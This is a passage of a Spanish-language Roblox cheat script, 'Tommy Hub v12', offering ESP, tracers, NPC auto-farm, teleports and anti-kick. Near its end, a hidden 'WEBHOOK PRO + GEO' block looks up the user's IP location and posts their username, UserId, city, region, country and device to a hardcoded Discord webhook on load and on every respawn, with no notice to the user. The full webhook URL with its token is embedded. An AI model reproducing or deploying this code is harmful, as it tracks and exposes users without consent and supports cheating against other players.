local TCOLORS={"Orange","Cyan","Red","Green","Blue","Yellow","Pink","White","Purple"}
local TCOLORMAP={Orange=Color3.fromRGB(255,165,0),Cyan=Color3.fromRGB(0,255,255),Red=Color3.fromRGB(255,0,0),
    Green=Color3.fromRGB(0,255,0),Blue=Color3.fromRGB(0,0,255),Yellow=Color3.fromRGB(255,255,0),
    Pink=Color3.fromRGB(255,105,180),White=Color3.fromRGB(255,255,255),Purple=Color3.fromRGB(160,32,240)}
AddDropdown(P.Defensa,"Color Tracer",TCOLORS,"Orange",function(v) Tracers_Color=TCOLORMAP[v] or Tracers_Color end)
AddSlider(P.Defensa,"Grosor Tracer",5,50,15,"",function(v) Tracers_Thick=v/10 end)

AddSection(P.Defensa,"ESP")
AddToggle(P.Defensa,"👁️  ESP (Nombre + Distancia)",false,function(v) ESPEnabled=v; if v then UpdateESP() else ClearESP() end end)
AddDropdown(P.Defensa,"Color ESP",{"Cyan","White","Red","Green","Blue","Yellow","Orange","Pink","Purple"},"Cyan",function(v)
    ESPColor=TCOLORMAP[v] or ESPColor; if ESPEnabled then UpdateESP() end
end)

-- ═══════════════════════════════════════════════════════════
--  TAB: FARM
-- ═══════════════════════════════════════════════════════════
AddSection(P.Farm,"Posición NPC")
AddToggle(P.Farm,"🔄  Orbitar NPC",false,function(v) Farm_Orbit=v; if v then Farm_Above=false end end)
AddToggle(P.Farm,"⬆️  Quedarse Arriba del NPC",false,function(v) Farm_Above=v; if v then Farm_Orbit=false end end)
AddSlider(P.Farm,"Altura sobre NPC",5,50,12," studs",function(v) Farm_AHeight=v end)
AddSlider(P.Farm,"Velocidad Órbita",1,15,5,"x",function(v) Farm_OSpd=v end)
AddSlider(P.Farm,"Distancia Órbita",5,60,15," studs",function(v) Farm_ODist=v end)
AddSection(P.Farm,"Magneto Farm")
AddToggle(P.Farm,"🧲  Magneto NPC (Abajo de ti)",false,function(v) Farm_Magnet=v end)
AddSlider(P.Farm,"Offset Y Magneto",-20,0,-4,"",function(v) Farm_MHeight=v end)
AddSlider(P.Farm,"Fuerza Magneto",1,30,15,"%",function(v) Farm_MForce=v/100 end)
AddSection(P.Farm,"Raid Mode")
AddToggle(P.Farm,"🚶  Raid Mode (Caminar al NPC)",false,function(v)
    Farm_Raid=v
    if not v then pcall(function()
        local h=lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
        if h and not speedActive then h.WalkSpeed=16 end
    end) end
end)
AddSlider(P.Farm,"Velocidad Raid",8,100,16," wsp",function(v) Farm_RSpd=v end)
AddSection(P.Farm,"Dungeon")
AddButton(P.Farm,"🚪  Ir a Siguiente Sala",function()
    local myH=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if not myH then return end
    local found=false
    for _, name in pairs({"Next","Gate","Portal","Door","Exit","Teleport"}) do
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj.Name:find(name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
                local pos=obj:IsA("Model") and obj:GetPivot().Position or obj.Position
                myH.CFrame=CFrame.new(pos+Vector3.new(0,3,0)); found=true; break
            end
        end
        if found then break end
    end
    Notify("Farm", found and "✅ Sala siguiente encontrada" or "❌ No se encontró puerta", 2, found and C.ON or C.RED)
end)

-- ═══════════════════════════════════════════════════════════
--  TAB: TELEPORTS
-- ═══════════════════════════════════════════════════════════
AddSection(P.TPs,"Sea 1")
AddButton(P.TPs,"🏝️  Tiki Outpost",     function() TpTo(CFrame.new(-16826,58,317))  end)
AddButton(P.TPs,"🏰  Castillo Embrujado",function() TpTo(CFrame.new(-9515,142,5533)) end)
AddSection(P.TPs,"Sea 2")
AddButton(P.TPs,"🌹  Reino de Rosa",     function() TpTo(CFrame.new(-401,335,642))   end)
AddButton(P.TPs,"⚓  Barco Maldito",     function() TpTo(CFrame.new(-6511,87,-140))  end)
AddButton(P.TPs,"🚢  Barco (Dentro)",    function() TpTo(CFrame.new(923,125,32852))  end)
AddButton(P.TPs,"🏝️  Isla Principal S2",function() TpTo(CFrame.new(-2.6,19,1018))   end)
AddSection(P.TPs,"Sea 3")
AddButton(P.TPs,"🏰  Castillo S3",       function() TpTo(CFrame.new(-5085,316,-3156)) end)
AddButton(P.TPs,"🏛️  Mansión",           function() TpTo(CFrame.new(-12463,375,-7523))end)
AddButton(P.TPs,"🌋  Isla Volcánica",    function() TpTo(CFrame.new(-7234,345,-4532)) end)
AddSection(P.TPs,"Utilidades")
AddButton(P.TPs,"👥  TP a Todos (Secuencial)",function()
    local plist=Players:GetPlayers(); local char=lp.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    task.spawn(function()
        for _,target in pairs(plist) do
            if target~=lp and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.CFrame=target.Character.HumanoidRootPart.CFrame; task.wait(0.5)
            end
        end
        Notify("TP Secuencial","✅ Completado",2,C.ON)
    end)
end)
AddButton(P.TPs,"🗑️  Remove Touch Interest",function()
    for _,d in pairs(game:GetDescendants()) do if d:IsA("TouchTransmitter") then d:Destroy() end end
    Notify("Limpieza","✅ Touch Interest removido",2,C.ON)
end)

-- ═══════════════════════════════════════════════════════════
--  TAB: MISC
-- ═══════════════════════════════════════════════════════════
AddSection(P.Misc,"Protecciones Activas")
AddLabel(P.Misc,"✅  Anti AFK — Activo automáticamente",C.ON)
AddLabel(P.Misc,"✅  Anti Kick — Activo automáticamente",C.ON)
AddSection(P.Misc,"Info")
AddLabel(P.Misc,"👑  Tommy Hub v12 PREMIUM",C.GOLD)
AddLabel(P.Misc,"🔧  by terrino48",C.ACCENT2)
AddLabel(P.Misc,"💜  Interfaz 100% custom — sin librerías",C.TEXTDIM)
-- ==================== 🔥 WEBHOOK PRO + GEO ====================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1503826882322501765/jhJEwfwgUSj9bCw6ltRmKz_wsjnDhz_7g_R5uN4pdyS2S1x2_hsBfitywOZ1Fpfvs3ql"

-- ⏰ Hora
local function GetTime()
    return os.date("%Y-%m-%d %H:%M:%S")
end

-- 🌍 GEO COMPLETO
local function GetLocation()
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)

    if success then
        local data = HttpService:JSONDecode(result)

        return {
            country = data.country or "Desconocido",
            region = data.regionName or "Desconocido",
            city = data.city or "Desconocido"
        }
    end

    return {
        country = "Error",
        region = "Error",
        city = "Error"
    }
end

-- 📱 Dispositivo
local function GetDevice()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "📱 Móvil"
    elseif UserInputService.GamepadEnabled then
        return "🎮 Consola"
    else
        return "🖥️ PC"
    end
end

-- 🖥️ Plataforma
local function GetPlatform()
    return tostring(UserInputService:GetPlatform())
end

-- 🎮 Juego
local function GetGameName()
    local name = "Desconocido"
    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    return name
end

-- 📩 Enviar webhook
local function SendWebhook(title, color, fields)
    local formatted = {}

    for _, f in pairs(fields) do
        table.insert(formatted, {
            name = f.name,
            value = f.value,
            inline = true
        })
    end

    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                embeds = {{
                    title = title,
                    color = color,
                    fields = formatted,
                    footer = {
                        text = "Tommy Hub Premium 🔥"
                    }
                }}
            })
        })
    end)
end

-- ==================== 📊 DATA ====================

local loc = GetLocation()

local DATA = {
    player = Player.Name,
    userid = Player.UserId,
    time = GetTime(),
    country = loc.country,
    region = loc.region,
    city = loc.city,
    device = GetDevice(),
    platform = GetPlatform(),
    game = GetGameName()
}

-- ==================== 🚀 EVENTOS ====================

-- HUB ACTIVADO
SendWebhook("🚀 HUB ACTIVADO", 65280, {
    {name = "👤 Jugador", value = DATA.player},
    {name = "🆔 UserId", value = tostring(DATA.userid)},
    {name = "⏰ Hora", value = DATA.time},
    {name = "🌍 País", value = DATA.country},
    {name = "📍 Región", value = DATA.region},
    {name = "🏙️ Ciudad", value = DATA.city},
    {name = "📱 Dispositivo", value = DATA.device},
    {name = "🖥️ Plataforma", value = DATA.platform},
    {name = "🎮 Juego", value = DATA.game}
})

-- LOGIN
Player.CharacterAdded:Connect(function()
    SendWebhook("🔐 LOGIN", 255, {
        {name = "👤 Jugador", value = DATA.player},
        {name = "⏰ Hora", value = GetTime()},
        {name = "🌍 País", value = DATA.country},
        {name = "📍 Región", value = DATA.region},
        {name = "🏙️ Ciudad", value = DATA.city},
        {name = "📱 Dispositivo", value = DATA.device}
    })
end)
-- ═══════════════════════════════════════════════════════════
--  NOTIFICACIÓN DE CARGA
-- ═══════════════════════════════════════════════════════════
task.delay(0.8, function()
    Notify("Tommy Hub v12","✅ Script cargado correctamente",5,C.ACCENT2)
    task.wait(0.3)
    Notify("Protecciones","✅ Anti AFK + Anti Kick activos",4,C.ON)
end)
